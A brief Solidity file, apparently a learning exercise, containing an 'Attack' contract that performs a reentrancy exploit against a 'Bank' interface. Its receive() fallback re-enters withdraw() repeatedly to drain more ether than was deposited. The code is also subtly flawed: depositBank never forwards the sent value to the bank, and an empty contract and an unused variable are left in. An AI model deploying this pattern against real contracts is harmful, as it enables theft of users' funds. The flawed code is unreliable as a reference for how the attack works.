// SPDX-License-Identifier: MIT

pragma solidity 0.7.5;

interface Bank{
    function getContractBalance() external view returns(uint);
    function getBalance() external view returns(uint);
    function deposit() external payable;
    function withdraw(uint _amount) external;
}

contract oio{

} 

contract Attack{
    oio jiji;
    Bank bank;
    uint sentAmount;
    uint i;

    constructor(address _bankAddr) public{
        bank = Bank(_bankAddr);
    }

    receive() external payable {
        if(i < 3){
            i++;
            bank.withdraw(sentAmount);
        }
    }

    function getContractBalance() external view returns(uint){
        return address(this).balance;
    }

    function depositBank() external payable{
        sentAmount = msg.value;
        bank.deposit();
    }

    function startAttack() external {
        bank.withdraw(sentAmount);
    }
}